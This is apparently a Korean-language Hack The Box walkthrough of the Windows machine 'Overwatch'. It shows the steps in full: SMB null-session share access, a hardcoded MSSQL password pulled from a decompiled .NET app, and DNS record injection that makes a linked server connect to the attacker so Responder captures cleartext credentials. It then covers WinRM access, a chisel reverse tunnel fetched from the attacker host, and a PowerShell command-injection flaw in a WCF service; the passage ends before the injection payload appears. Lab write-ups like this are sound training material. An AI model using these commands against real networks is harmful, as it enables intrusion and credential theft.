---
title: "Overwatch (Medium)"
date: 2026-05-11
layout: single
excerpt: "Overwatch는 Medium 난이도의 Windows 머신으로, 초기에는 SMB null session을 통해 노출된 software$ 공유에 접근하면서 시작된다. 해당 공유에서 .NET 기반 모니터링 애플리케이션을 획득한 뒤, 이를 디컴파일하여 하드코딩된 sqlsvc MSSQL 자격증명을 발견한다. 이후 MSSQL 서비스가 기본 포트가 아닌 6520 포트에서 동작 중임을 확인하고, sqlsvc 계정으로 데이터베이스에 접속한다. MSSQL 내부를 탐색하던 중 SQL07이라는 linked server가 존재하지만 정상적으로 연결되지 않는 것을 확인하고, 해당 호스트명을 공격자 IP로 해석되도록 DNS 레코드를 조작한다. 이를 통해 linked server 연결 과정에서 사용되는 sqlmgmt 평문 자격증명을 Responder로 획득하고, WinRM을 통해 대상 시스템에 접근한다. 최종적으로 내부에서만 접근 가능한 WCF/SOAP 기반 MonitorService를 분석하여 KillProcess 기능의 PowerShell Command Injection 취약점을 발견하고, 이를 악용해 최종적으로 SYSTEM 권한을 획득한다."
author_profile: true
toc: true
toc_label: "Overwatch"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-windows/overwatch/overwatch.png
  teaser_home_page: true
categories: [hackthebox-windows]
tags: [windows, active-directory, smb, mssql, linked-server, adidns, dns, responder, winrm, dotnet, ilspy, wcf, soap, powershell, command-injection, chisel, priv-esc]

---

![Overwatch](/assets/htb-windows/overwatch/overwatch.png)

**Overwatch**는 Medium 난이도의 Windows 머신으로, 초기에는 SMB null session을 통해 노출된 `software$` 공유에 접근하면서 시작된다. 

해당 공유에서 **.NET 기반 모니터링 애플리케이션**을 획득한 뒤, 이를 디컴파일하여 하드코딩된 `sqlsvc` **MSSQL 자격증명**을 발견한다. 이후 MSSQL 서비스가 기본 포트가 아닌 `6520` 포트에서 동작 중임을 확인하고, `sqlsvc` 계정으로 데이터베이스에 접속한다.

MSSQL 내부를 탐색하던 중 `SQL07` 이라는 linked server가 존재하지만 정상적으로 연결되지 않는 것을 확인하고, 해당 호스트명을 공격자 IP로 해석되도록 **DNS 레코드를 조작**한다. 

이를 통해 linked server 연결 과정에서 사용되는 `sqlmgmt` 평문 자격증명을 `Responder` 로 획득하고, WinRM을 통해 대상 시스템에 접근한다.

최종적으로 내부에서만 접근 가능한 **WCF/SOAP 기반 MonitorService**를 분석하여 `KillProcess` 기능의 **PowerShell Command Injection** 취약점을 발견하고, 이를 악용해 SYSTEM 권한을 획득한다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.31.201`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.31.201                      

Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 03:46 EDT
Nmap scan report for overwatch.htb (10.129.31.201)
Host is up (0.20s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-11 07:46:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-11T07:47:53+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2026-05-10T06:56:23
|_Not valid after:  2026-11-09T06:56:23
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-11T07:47:14+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=5/11%Time=6A018978%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-11T07:47:18
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.13 seconds
```

스캔 결과, Kerberos(`88`), LDAP(`389`, `636`, `3268`), SMB(`445`), WinRM(`5985`), DNS(`53`), RPC(`135`, `593`) 등의 서비스가 활성화되어 있다.

또한 LDAP 배너 정보를 통해 도메인은 `overwatch.htb`, 호스트는 `S200401.overwatch.htb` 임을 확인하였다.

---

# Vulnerability Analysis

## SMB Enumeration

SMB null session을 이용하여 공유 열거를 수행하였다:

```bash
$ smbclient -L //10.129.31.201 -N           

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        software$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.31.201 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

그 결과 `software$` 공유가 익명 사용자에게 노출되어 있는 것을 확인할 수 있었다.

이후 `software$` 공유에 null session으로 접근을 시도하였고, 내부에는 `Monitoring` 디렉토리가 존재하였다:

```bash
$ smbclient //10.129.244.81/software$ -N

smb: \> ls
  .                                  DH        0  Fri May 16 21:27:07 2025
  ..                                DHS        0  Thu Jan  1 01:46:47 2026
  Monitoring                         DH        0  Fri May 16 21:32:43 2025
```

`Monitoring` 디렉토리 내부를 확인해보면 `overwatch.exe` 를 포함한 여러 `.NET` 관련 파일들이 존재하는 것을 확인할 수 있다:

```text
smb: \Monitoring\> ls

  .                                  DH        0  Fri May 16 21:32:43 2025
  ..                                 DH        0  Fri May 16 21:27:07 2025
  EntityFramework.dll                AH  4991352  Thu Apr 16 16:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 16:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 16:38:56 2020
  EntityFramework.xml                AH  3738289  Thu Apr 16 16:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 10:46:10 2017
  overwatch.exe                      AH     9728  Fri May 16 21:19:24 2025
  overwatch.exe.config               AH     2163  Fri May 16 21:02:30 2025
  overwatch.pdb                      AH    30208  Fri May 16 21:19:24 2025
  System.Data.SQLite.dll             AH   450232  Sun Sep 29 16:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 16:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 16:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 14:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 10:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 10:46:10 2017
  x64                                DH        0  Fri May 16 21:32:33 2025
  x86                                DH        0  Fri May 16 21:32:33 2025

                7147007 blocks of size 4096. 2281202 blocks available
```

특히 [System.Management.Automation.dll](https://learn.microsoft.com/ko-kr/powershell/scripting/dev-cross-plat/choosing-the-right-nuget-package?view=powershell-7.6#systemmanagementautomation) 파일이 존재하는 것으로 보아, 내부적으로 PowerShell 기능을 사용할 가능성을 의심할 수 있었다.

우선 `get` 명령을 이용하여 `overwatch.exe` 파일을 다운로드하였다:

```text
smb: \Monitoring\> get overwatch.exe

getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (12.0 KiloBytes/sec) (average 336.4 KiloBytes/sec)
```

파일 확인 결과, `overwatch.exe` 는 x86-64 기반의 `.NET Assembly` 임을 확인할 수 있었다:

```bash
$ file overwatch.exe

overwatch.exe: PE32+ executable for MS Windows 6.00 (console), x86-64 Mono/.Net assembly, 2 sections
```

## .NET Binary Decompilation

`.NET` 어셈블리 파일을 디컴파일하기 위해 [ILSpy](https://github.com/icsharpcode/ilspy) 도구를 사용하였다.

Microsoft의 [.NET 도구 관리 문서](https://learn.microsoft.com/ko-kr/dotnet/core/tools/global-tools)를 참고하여 전역 도구 설치 방식에 따라 설치를 시도하였다:

```bash
$ dotnet tool install --g ilspycmd  

/tmp/m45xfb1s.ifk/restore.csproj : error NU1202: Package ilspycmd 10.0.1.8346 is not compatible with net6.0 (.NETCoreApp,Version=v6.0) / any. Package ilspycmd 10.0.1.8346 supports: net10.0 (.NETCoreApp,Version=v10.0) / any                                                                                                                                                                                      
The tool package could not be restored.                                                                                                                                                                   
Tool 'ilspycmd' failed to install. This failure may have been caused by:                                                                                                                                  
                                                                                                                                                                                                          
* You are attempting to install a preview release and did not use the --version option to specify the version.                                                                                            
* A package by this name was found, but it was not a .NET tool.                                                                                                                                           
* The required NuGet feed cannot be accessed, perhaps because of an Internet connection problem.                                                                                                          
* You mistyped the name of the tool.                                                                                                                                                                      
                                                                                                                                                                                                         
For more reasons, including package naming enforcement, visit https://aka.ms/failure-installing-tool 
```

현재 시스템의 `.NET` 버전과 최신 `ilspycmd` 버전이 호환되지 않아 설치에 실패하였다.

이에 따라 [NuGet 패키지 페이지](https://www.nuget.org/packages/ilspycmd/8.2.0.7535) 를 참고하여, 현재 환경과 호환되는 버전을 설치하였다:

```bash
$ dotnet tool install --global ilspycmd --version 8.2.0.7535

You can invoke the tool using the following command: ilspycmd
Tool 'ilspycmd' (version '8.2.0.7535') was successfully installed.                                                                                                                                        
```

이후 디컴파일 결과를 저장할 디렉토리를 생성한 뒤, `ilspycmd` 를 이용하여 `overwatch.exe` 를 디컴파일하였다:

```bash
$ mkdir overwatch
```

```bash
$ ilspycmd -p -o overwatch overwatch.exe

You are not using the latest version of the tool, please update.
Latest version is '10.0.1.8346' (yours is '8.2.0.7535-95108c96')
```

최신 버전이 아니라는 경고 메시지가 출력되었지만, 디컴파일 자체에는 문제가 없으므로 그대로 진행하였다.

생성된 `overwatch` 디렉토리를 확인해보면, 다음과 같이 디컴파일된 프로젝트 파일들이 생성된 것을 확인할 수 있다:

```bash
$ ls -al overwatch

drwxrwxr-x 3 kali kali 4096 May 11 04:55 .
drwxrwxr-x 4 kali kali 4096 May 11 04:55 ..
-rw-r--r-- 1 kali kali 2163 May  9 17:47 app.config
-rw-rw-r-- 1 kali kali  245 May 11 04:55 IMonitoringService.cs
-rw-rw-r-- 1 kali kali 4060 May 11 04:55 MonitoringService.cs
-rw-rw-r-- 1 kali kali  848 May 11 04:55 overwatch.csproj
-rw-rw-r-- 1 kali kali 2807 May 11 04:55 Program.cs
drwxrwxr-x 2 kali kali 4096 May 11 04:55 Properties
```

## Discovery of sqlsvc Credentials

디컴파일된 파일 중 `MonitoringService.cs` 를 확인해보면, MSSQL 연결 문자열이 하드코딩되어 있는 것을 확인할 수 있다:

```cs
$ cat MonitoringService.cs

// SKIP

private readonly string connectionString = "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;";

// SKIP
```

해당 연결 문자열을 통해 다음 자격증명을 획득할 수 있었다:

```text
Username : sqlsvc
Password : TI0LKcfHzZw1Vv
```

또한 `app.config` 파일을 확인해보면, overwatch.htb의 `8000` 포트에서 **MonitorService**라는 서비스가 동작하도록 설정되어 있는 것을 확인할 수 있다:

```bash
$ cat app.config  
        
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
# SKIP
```

그러나 `8000` 포트를 직접 확인해보면, 해당 포트는 `filtered` 상태로 확인된다:

```bash
$ nmap -sC -sV -p8000 10.129.31.201  

Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 05:42 EDT
Nmap scan report for overwatch.htb (10.129.31.201)
Host is up (0.19s latency).

PORT     STATE    SERVICE  VERSION
8000/tcp filtered http-alt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

따라서 MonitorService는 외부에서 직접 접근할 수 없고, 내부에서만 접근 가능한 서비스일 가능성이 높다. 

> 해당 서비스에 대한 자세한 분석은 이후 권한 상승 파트에서 다룰 예정이다.

## MSSQL Enumeration

현재 획득한 `sqlsvc` 계정명이 MSSQL 서비스 계정일 가능성이 높다고 판단하여, [impacket](https://github.com/fortra/impacket/tree/master)의 `mssqlclient` 도구를 이용해 접속을 시도하였다:

```bash
$ impacket-mssqlclient -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Traceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/mssqlclient.py", line 97, in <module>
    ms_sql.connect()
    ~~~~~~~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/impacket/tds.py", line 540, in connect
    sock.connect(sa)
    ~~~~~~~~~~~~^^^^
TimeoutError: [Errno 110] Connection timed out
```

그러나 연결 시도 결과 타임아웃이 발생하였다.

### Portscan

기존 `nmap -sC -sV` 스캔은 기본적으로 일부 주요 포트만 대상으로 수행되므로, MSSQL 서비스가 비표준 포트에서 동작하고 있을 가능성을 고려하여 전체 고포트 대역에 대해 추가 스캔을 수행하였다:

```bash
$ nmap -sCV -p 6000-65535 -T4 --min-rate 5000 10.129.31.201
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 06:12 EDT
Nmap scan report for overwatch.htb (10.129.31.201)
Host is up (0.30s latency).
Not shown: 59527 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
6520/tcp  open  ms-sql-s   Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.244.81:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.244.81:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-11T06:58:38
|_Not valid after:  2056-05-11T06:58:38
|_ssl-date: 2026-05-11T10:14:15+00:00; +1s from scanner time.
9389/tcp  open  mc-nmf     .NET Message Framing
49664/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
50906/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
50907/tcp open  msrpc      Microsoft Windows RPC
50914/tcp open  msrpc      Microsoft Windows RPC
58518/tcp open  tcpwrapped
63566/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.27 seconds
```

스캔 결과 `6520` 포트에서 MSSQL 서비스가 동작 중인 것을 확인할 수 있었다.

이후 `mssqlclient` 를 이용하여 해당 포트를 지정해 다시 접속을 시도한 결과 정상적으로 연결에 성공하였다:

```bash
$ impacket-mssqlclient -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb -p 6520

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```

### Linked Server Enumeration

우선 `enum_links` 기능을 이용하여 현재 구성된 MSSQL linked server 정보를 확인하였다:

```text
SQL (OVERWATCH\sqlsvc  guest@master)> enum_links

SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      

SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------ 
```

이를 통해 `SQL07` 이라는 linked server가 존재하는 것을 확인할 수 있었다.

이후 `use_link SQL07` 을 이용하여 해당 linked server로의 연결을 시도하였다:

```text
SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07

INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [53]. 
```

현재 SQL07 linked server는 정상적으로 연결되지 않았으며, 대상 서버에 접근할 수 없는 상태로 보인다.

하지만 linked server가 SQL07이라는 호스트명을 기반으로 연결을 시도하고 있다는 점에 주목하였다. 

따라서 공격자가 해당 호스트명을 제어할 수 있다면, MSSQL 서버가 linked server로 연결을 시도하는 과정에서 인증 정보를 탈취할 가능성이 존재한다고 판단하였다.

---

# Exploitation

## Linked Server Spoofing

우선 `sqlsvc` 계정이 DNS에 새로운 레코드를 생성할 수 있는지 확인하기 위하여 [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)을 이용해 테스트용 DNS 레코드를 추가하였다:

```bash
$ dnstool -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -a add -r test -d 10.10.14.174 10.129.31.201

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

이후 `dig` 를 이용하여 레코드가 정상적으로 생성되었는지 확인하였다:

```bash
$ dig @10.129.31.201 test.overwatch.htb                                                             

; <<>> DiG 9.20.9-1-Debian <<>> @10.129.31.201 test.overwatch.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27337
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;test.overwatch.htb.            IN      A

;; ANSWER SECTION:
test.overwatch.htb.     180     IN      A       10.10.14.174

;; Query time: 199 msec
;; SERVER: 10.129.31.201#53(10.129.31.201) (UDP)
;; WHEN: Tue May 12 03:42:49 EDT 2026
;; MSG SIZE  rcvd: 63
```

이처럼 `test.overwatch.htb` 레코드가 정상적으로 attacker IP를 가리키고 있는 것을 확인할 수 있었다.

이를 통해 `sqlsvc` 계정이 DNS에 새로운 레코드를 생성할 수 있음을 확인하였다.

이후 linked server가 참조하는 SQL07 호스트의 DNS 레코드를 attacker IP로 등록하였다:

```bash
$ dnstool -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -a add -r SQL07 -d 10.10.14.174 10.129.31.201
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

정상적으로 SQL07 레코드가 공격자 IP를 가리키도록 등록되었다.

MSSQL linked server는 원격 SQL 서버 연결 시 별도의 remote login 정보를 사용할 수 있으므로, 실제 연결 과정에서 어떤 자격증명이 사용되는지 확인하기 위해 Responder를 이용하여 대기시켰다:

```bash
$ sudo responder -I tun0

# SKIP

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.174]
    Responder IPv6             [dead:beef:2::10ac]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-UZZROEZN30Y]
    Responder Domain Name      [65RY.LOCAL]
    Responder DCE-RPC Port     [47591]

[+] Listening for events...
```

이후 다시 MSSQL로 돌아가 `use_link SQL07` 을 실행하였다:

```text
SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07

INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
```

이전과 달리 더 이상 연결 타임아웃은 발생하지 않았다. 이는 `SQL07` 호스트명이 정상적으로 attacker IP로 해석되고 있음을 의미한다.

다만 attacker 서버는 실제 MSSQL 서버가 아니므로, 연결 과정에서 프로토콜 오류가 발생하며 세션이 종료된다.

하지만 Responder 출력을 확인해보면 다음과 같이 linked server 연결 과정에서 사용된 평문 자격증명을 획득할 수 있었다:

```text
[MSSQL] Cleartext Client   : 10.129.31.201
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

## sqlmgmt Shell via WinRM

획득한 자격증명을 이용하여 `nxc` 를 통해 WinRM 접근이 가능함을 확인하였다:

```bash
$ nxc winrm S200401.overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx

WINRM       10.129.31.201   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
WINRM       10.129.31.201   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
```

이를 바탕으로 `Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속 결과, 성공적으로 **sqlmgmt 사용자의 PowerShell 세션을 획득**하였다:

![Overwatch](/assets/htb-windows/overwatch/sqlmgmt-shell.png)

---

# Privilege Escalation

## Monitoring Service Enumeration

앞서 `app.config`에서 확인한 `8000` 포트의 `MonitorService` 가 실제로 대상 시스템에서 리스닝 중인지 확인하였다:

```text
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> netstat -ano | findstr :8000

  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    [::]:8000              [::]:0                 LISTENING       4
```

이를 통해 대상 시스템에서 `8000` 포트가 실제로 리스닝 중임을 확인할 수 있었다.

이후 WinRM 세션에서 `Invoke-WebRequest` 를 이용하여 해당 서비스에 접근하였다:

```text
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> iwr -usebasicparsing http://overwatch.htb:8000/MonitorService

StatusCode        : 200
StatusDescription : OK
Content           : <HTML lang="en"><HEAD><link rel="alternate" type="text/xml" href="http://overwatch.htb:8000/MonitorService?disco"/><STYLE type="text/css">#content{ FONT-SIZE: 0.7em; PADDING-BOTTOM: 2em; MARGIN-LEFT: ...
RawContent        : HTTP/1.1 200 OK
                    Content-Length: 3077
                    Content-Type: text/html; charset=UTF-8
                    Date: Tue, 12 May 2026 09:37:16 GMT
                    Server: Microsoft-HTTPAPI/2.0

                    <HTML lang="en"><HEAD><link rel="alternate" type="t...
Forms             :
Headers           : {[Content-Length, 3077], [Content-Type, text/html; charset=UTF-8], [Date, Tue, 12 May 2026 09:37:16 GMT], [Server, Microsoft-HTTPAPI/2.0]}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<A HREF="http://overwatch.htb:8000/MonitorService?wsdl">http://overwatch.htb:8000/MonitorService?wsdl</A>; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?wsdl}, @{outerHTML=<A
                    HREF="http://overwatch.htb:8000/MonitorService?singleWsdl">http://overwatch.htb:8000/MonitorService?singleWsdl</A>; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?singleWsdl}}
ParsedHtml        :
RawContentLength  : 3077
```

응답 결과 `MonitorService?wsdl` 및 `MonitorService?singleWsdl` 링크가 포함되어 있는 것을 확인할 수 있었으며, 이를 통해 해당 서비스가 `WCF/SOAP` 기반 서비스임을 알 수 있었다.

## Port Forwarding with Chisel

브라우저를 이용하여 내부 서비스를 보다 편하게 분석하기 위해 [chisel](https://github.com/jpillora/chisel)을 이용해 리버스 포트 포워딩을 구성하였다.

우선 `chisel.exe` 파일을 대상 서버로 전송하기 위해 로컬에서 Python HTTP 서버를 실행하였다:

```bash
$ python3 -m http.server  

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

이후 대상 서버에서 `wget` 을 이용해 `chisel.exe` 파일을 다운로드하였다:

```text
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> wget 10.10.14.174:8000/chisel.exe -O chisel.exe
```

그 다음 로컬 터미널에서 `chisel` 서버를 실행하였다:

```bash
$ ./chisel server --reverse -p 9001

2026/05/12 05:42:50 server: Reverse tunnelling enabled
2026/05/12 05:42:50 server: Fingerprint /O7pPp6CcgbfhmFpP1UZftLFymdKUmiw2w7HgT7eInQ=
2026/05/12 05:42:50 server: Listening on http://0.0.0.0:9001
```

이후 대상 서버에서 reverse tunnel을 연결하였다:

```text
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> .\chisel.exe client 10.10.14.174:9001 R:8123:localhost:8000

chisel.exe : 2026/05/12 02:44:09 client: Connecting to ws://10.10.14.174:9001
    + CategoryInfo          : NotSpecified: (2026/05/12 02:4....10.14.174:9001:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/05/12 02:44:11 client: Connected (Latency 200.4452ms)
```

위 설정은 공격자 시스템의 `8123` 포트로 들어오는 트래픽을 대상 시스템의 `localhost:8000` 으로 전달한다.

실제로 `netstat` 를 통해 `8123` 포트가 리스닝 중인 것을 확인할 수 있었다:

```bash
$ netstat -lp | grep 8123

tcp6       0      0 [::]:8123               [::]:*                  LISTEN      113600/./chisel 
```

## WSDL Enumeration

이후 포트포워딩된 8123 포트를 이용하여 브라우저로 서비스에 접근하였다:

![Overwatch](/assets/htb-windows/overwatch/website.png)

서비스 페이지에 표시된 `?wsdl` 엔드포인트에 접근하면 다음과 같이 WSDL 문서를 확인할 수 있다:

```xml
<wsdl:definitions name="MonitoringService" targetNamespace="http://tempuri.org/">

# SKIP

<wsdl:operation name="StartMonitoring">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/StartMonitoring" style="document"/>

# SKIP

<wsdl:operation name="StopMonitoring">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/StopMonitoring" style="document"/>

# SKIP

<wsdl:operation name="KillProcess">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/KillProcess" style="document"/>

# SKIP
```

WSDL 문서를 통해 `StartMonitoring`, `StopMonitoring`, `KillProcess` 세 개의 operation이 존재하는 것을 확인할 수 있었다.

## Revisiting Decompiled Files

디컴파일된 `MonitoringService.cs` 파일을 확인해보면, `KillProcess` 함수에서 취약한 로직을 발견할 수 있다:

```cs
// SKIP
public string KillProcess(string processName)
{
        string text = "Stop-Process -Name " + processName + " -Force";
        try
        {
                Runspace val = RunspaceFactory.CreateRunspace();
                try
                {
                        val.Open();
                        Pipeline val2 = val.CreatePipeline();
                        try
                        {
                                val2.Commands.AddScript(text);
                                val2.Commands.Add("Out-String");
                                Collection<PSObject> collection = val2.Invoke();
                                val.Close();
                                StringBuilder stringBuilder = new StringBuilder();
                                foreach (PSObject item in collection)
                                {
                                        stringBuilder.AppendLine(((object)item).ToString());
                                }
                                return stringBuilder.ToString();
                        }
                        finally
                        {
                                ((IDisposable)val2)?.Dispose();
                        }
                }
                finally
                {
                        ((IDisposable)val)?.Dispose();
                }
        }
        catch (Exception ex)
        {
                return "Error: " + ex.Message;
        }
}
```

해당 함수는 `processName` 이라는 문자열 인자를 받은 뒤, 이를 별도의 검증이나 이스케이프 처리 없이 PowerShell 명령어 문자열에 직접 이어붙인다.

예를 들어 `processName` 에 `notepad` 가 전달되면 `text` 변수에는 다음과 같은 PowerShell 명령어가 저장된다:

```powershell
Stop-Process -Name notepad -Force
```

